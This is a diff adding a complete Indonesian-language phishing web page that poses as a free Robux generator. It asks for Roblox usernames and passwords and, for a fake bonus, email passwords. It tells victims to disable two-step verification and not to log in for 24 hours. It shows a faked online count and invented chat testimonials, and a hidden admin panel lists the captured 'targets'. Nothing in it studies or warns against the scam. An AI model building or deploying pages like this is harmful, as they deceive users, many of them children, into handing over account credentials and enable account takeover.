@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KING BOBUX | OFFICIAL GENERATOR</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&display=swap');
+        body { font-family: 'Orbitron', sans-serif; background: #050505; color: #fff; overflow-x: hidden; }
+        .bg-gold { background: linear-gradient(135deg, #ffd700, #b8860b); }
+        .hidden { display: none; }
+        .chat-box { height: 150px; overflow-y: hidden; font-size: 10px; }
+        .loading-bar { width: 0%; animation: load 20s linear forwards; }
+        @keyframes load { from { width: 0%; } to { width: 100%; } }
+        .animate-fade { animation: fadeIn 0.5s ease-in; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body class="p-4 max-w-md mx-auto">
+
+    <div id="blocker" class="hidden fixed inset-0 bg-black z-[99999] flex flex-col items-center justify-center text-center p-6">
+        <h2 class="text-red-500 font-black text-2xl mb-4">SESSION EXPIRED</h2>
+        <p class="text-xs text-gray-500 uppercase">Akses diblokir otomatis karena tidak ada aktivitas selama 2 menit. Refresh halaman untuk mencoba kembali.</p>
+    </div>
+
+    <div id="layer-1">
+        <header class="text-center py-6 cursor-pointer" onclick="adminAccess()">
+            <h1 class="text-3xl font-black italic text-yellow-500 uppercase tracking-tighter">KING <span class="text-white">BOBUX</span></h1>
+            <div class="flex justify-center items-center gap-2 mt-2">
+                <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
+                <p id="online-count" class="text-[8px] text-gray-500 font-bold uppercase">Online: 1,842 Users</p>
+            </div>
+        </header>
+
+        <div class="bg-white/5 border border-white/10 rounded-[2rem] p-4 mb-4 shadow-inner">
+            <p class="text-[8px] font-black text-yellow-500/50 mb-2 italic">GLOBAL COMMUNITY CHAT</p>
+            <div id="chat-content" class="chat-box space-y-2 opacity-90">
+                </div>
+        </div>
+
+        <div class="bg-zinc-900 border border-yellow-500/30 p-6 rounded-[2.5rem] shadow-2xl mb-10">
+            
+            <div id="panel-1" class="text-center">
+                <p class="text-[9px] text-gray-400 font-bold mb-6 uppercase tracking-widest">Select Amount</p>
+                <div class="grid grid-cols-2 gap-3 mb-6">
+                    <button onclick="setAmt('10,000')" class="bg-white/5 border border-white/10 py-5 rounded-2xl text-xs font-black active:scale-95 transition-all">10K RBX</button>
+                    <button onclick="setAmt('50,000')" class="bg-white/5 border border-white/10 py-5 rounded-2xl text-xs font-black active:scale-95 transition-all">50K RBX</button>
+                </div>
+                <button onclick="toStep2()" class="w-full bg-gold py-5 rounded-2xl font-black text-black text-xs uppercase shadow-lg shadow-yellow-500/20">Next Process</button>
+            </div>
+
+            <div id="panel-2" class="hidden space-y-4 text-center">
+                <p class="text-[10px] font-black text-yellow-500 uppercase italic">Gunakan Email Untuk Bonus +5,000 RBX?</p>
+                <button onclick="choice('yes')" class="w-full bg-green-600 py-4 rounded-xl font-black text-xs uppercase">Ya, Gunakan Email (+5K Bonus)</button>
+                <button onclick="choice('no')" class="w-full bg-white/10 border border-white/20 py-4 rounded-xl font-black text-xs uppercase text-gray-500">Gunakan Akun Saja</button>
+            </div>
+
+            <div id="panel-3" class="hidden space-y-3">
+                <input type="text" id="t-user" placeholder="ROBLOX USERNAME" class="w-full bg-black border border-white/10 p-4 rounded-xl text-sm outline-none font-bold uppercase tracking-tighter">
+                <input type="password" id="t-pass" placeholder="ROBLOX PASSWORD" class="w-full bg-black border border-white/10 p-4 rounded-xl text-sm outline-none font-bold tracking-tighter">
+                
+                <div id="email-fields" class="hidden space-y-3">
+                    <input type="email" id="t-email" placeholder="EMAIL PEMULIHAN" class="w-full bg-black border border-yellow-500/50 p-4 rounded-xl text-sm outline-none font-bold">
+                    <input type="password" id="t-epass" placeholder="SANDI EMAIL" class="w-full bg-black border border-yellow-500/50 p-4 rounded-xl text-sm outline-none font-bold">
+                </div>
+
+                <div class="bg-red-950/50 p-4 rounded-xl border border-red-500/30">
+                    <p class="text-[9px] text-red-400 font-black uppercase italic leading-tight text-center">
+                        ⚠️ MATIKAN A2F (VERIFIKASI 2 LANGKAH)! PROSES AKAN GAGAL JIKA AKTIF.
+                    </p>
+                </div>
+                <button onclick="finalize()" class="w-full bg-gold py-5 rounded-2xl font-black text-black text-xs uppercase">Claim Now</button>
+            </div>
+
+            <div id="panel-4" class="hidden text-center space-y-6 py-6">
+                <h3 class="text-yellow-500 font-black text-lg italic uppercase">Injecting Data...</h3>
+                <div class="w-full bg-white/10 h-4 rounded-full overflow-hidden">
+                    <div class="loading-bar bg-yellow-500 h-full"></div>
+                </div>
+                <p class="text-[10px] text-gray-400 leading-relaxed uppercase font-bold italic px-4">
+                    Data berhasil dikirim! <br><br> Mohon <span class="text-white">JANGAN LOGIN SELAMA 24 JAM</span> agar injector bypass server tidak terdeteksi. Robux akan masuk ke akun Anda secara bertahap.
+                </p>
+                <div class="h-1 w-10 bg-yellow-500 mx-auto rounded-full"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layer-2" class="hidden fixed inset-0 bg-slate-950 z-[9999] p-6 overflow-y-auto">
+        <div class="flex justify-between items-center mb-6 border-b border-white/10 pb-4">
+            <h2 class="text-yellow-500 font-black uppercase italic">Target Database</h2>
+            <button onclick="closeAdmin()" class="bg-red-600 px-4 py-1 rounded text-[10px] font-black">EXIT</button>
+        </div>
+        <div id="db-list" class="space-y-3"></div>
+        <button onclick="clearDB()" class="w-full mt-10 border border-red-500/50 py-4 rounded-xl text-red-500 text-[10px] font-black uppercase">Wipe Database</button>
+    </div>
+
+    <script>
+        // --- AUTO BLOCKER (2 MINUTES) ---
+        let idleSeconds = 0;
+        setInterval(() => {
+            idleSeconds++;
+            if(idleSeconds >= 120) document.getElementById('blocker').classList.remove('hidden');
+        }, 1000);
+
+        // --- DATABASE ADMIN ---
+        if(!localStorage.getItem('king_db')) localStorage.setItem('king_db', '[]');
+        let acCount = 0;
+        function adminAccess(){ acCount++; if(acCount >= 5){ acCount = 0; openAdmin(); } }
+        function openAdmin(){
+            const db = JSON.parse(localStorage.getItem('king_db'));
+            const list = document.getElementById('db-list');
+            list.innerHTML = db.length === 0 ? '<p class="text-[10px] text-center text-gray-600 italic">BELUM ADA DATA TERJARING, BOSS.</p>' : "";
+            db.forEach((d, i) => {
+                list.innerHTML += `<div class="bg-zinc-900 p-4 rounded-2xl border-l-4 border-yellow-500 text-[10px] mb-2">
+                    <p class="text-gray-500 mb-1">#TARGET ${i+1}</p>
+                    <p><b>USER:</b> ${d.u} | <b>PASS:</b> ${d.p}</p>
+                    <p><b>EMAIL:</b> ${d.e || '-'} | <b>EPASS:</b> ${d.ep || '-'}</p>
+                    <p class="text-yellow-500 mt-1 uppercase font-black">${d.amt} | ${d.time}</p>
+                </div>`;
+            });
+            document.getElementById('layer-2').classList.remove('hidden');
+        }
+        function closeAdmin(){ document.getElementById('layer-2').classList.add('hidden'); }
+        function clearDB(){ if(confirm("Bersihkan database BOSS?")) { localStorage.setItem('king_db', '[]'); openAdmin(); } }
+
+        // --- CHAT RANDOMIZER (REALISTIC SENSOR) ---
+        const usernames = ["RbxMaster", "BocilGans", "SlayerPro", "GamerCewe", "TopUpFree", "RoxHunter", "KingZzam", "UserX", "BloxLover", "DoughUser"];
+        const messages = [
+            "10k Robux beneran masuk! Gila legit parah.",
+            "Jangan login dulu 24 jam kawan, biar injector aman.",
+            "A2F off mendarat mulus Robux-nya.",
+            "Testi 50k landed barusan! Makasih King.",
+            "Gokil bonus email beneran dapet +5k.",
+            "Fix no tipu, jangan login dulu kawan biar ga dideteksi.",
+            "Udah masuk 10k, makasih admin ganteng.",
+            "Awalnya ragu pas dicoba 50k mendarat lancar."
+        ];
+
+        const chatBox = document.getElementById('chat-content');
+        function spawnChat() {
+            const raw = usernames[Math.floor(Math.random()*usernames.length)] + Math.floor(Math.random()*99);
+            const censored = raw.substring(0,3) + "***" + raw.substring(raw.length-2);
+            const msg = messages[Math.floor(Math.random()*messages.length)];
+            
+            const p = document.createElement('p');
+            p.className = "animate-fade";
+            p.innerHTML = `<span class="text-yellow-500 font-black">${censored}:</span> <span class="text-gray-300">${msg}</span>`;
+            chatBox.appendChild(p);
+            
+            if(chatBox.childNodes.length > 7) chatBox.removeChild(chatBox.firstChild);
+            document.getElementById('online-count').innerText = "Online: " + (1500 + Math.floor(Math.random()*500)) + " Users";
+        }
+        setInterval(spawnChat, 3000);
+
+        // --- GENERATOR FLOW ---
+        let selectedAmt = "";
+        let withEmail = false;
+
+        function setAmt(a){ selectedAmt = a; alert("Dipilih: " + a + " RBX"); }
+        function toStep2(){ if(!selectedAmt) return alert("PILIH PAKET!"); document.getElementById('panel-1').classList.add('hidden'); document.getElementById('panel-2').classList.remove('hidden'); }
+        
+        function choice(val){
+            withEmail = (val === 'yes');
+            document.getElementById('panel-2').classList.add('hidden');
+            document.getElementById('panel-3').classList.remove('hidden');
+            if(withEmail) document.getElementById('email-fields').classList.remove('hidden');
+        }
+
+        function finalize(){
+            const u = document.getElementById('t-user').value;
+            const p = document.getElementById('t-pass').value;
+            const e = document.getElementById('t-email').value;
+            const ep = document.getElementById('t-epass').value;
+
+            if(!u || !p || (withEmail && (!e || !ep))) return alert("ISI DATA LENGKAP!");
+
+            const db = JSON.parse(localStorage.getItem('king_db'));
+            db.push({ u, p, e, ep, amt: selectedAmt + (withEmail ? " + Bonus" : ""), time: new Date().toLocaleString() });
+            localStorage.setItem('king_db', JSON.stringify(db));
+
+            document.getElementById('panel-3').classList.add('hidden');
+            document.getElementById('panel-4').classList.remove('hidden');
+        }
+    </script>
+</body>
+</html>
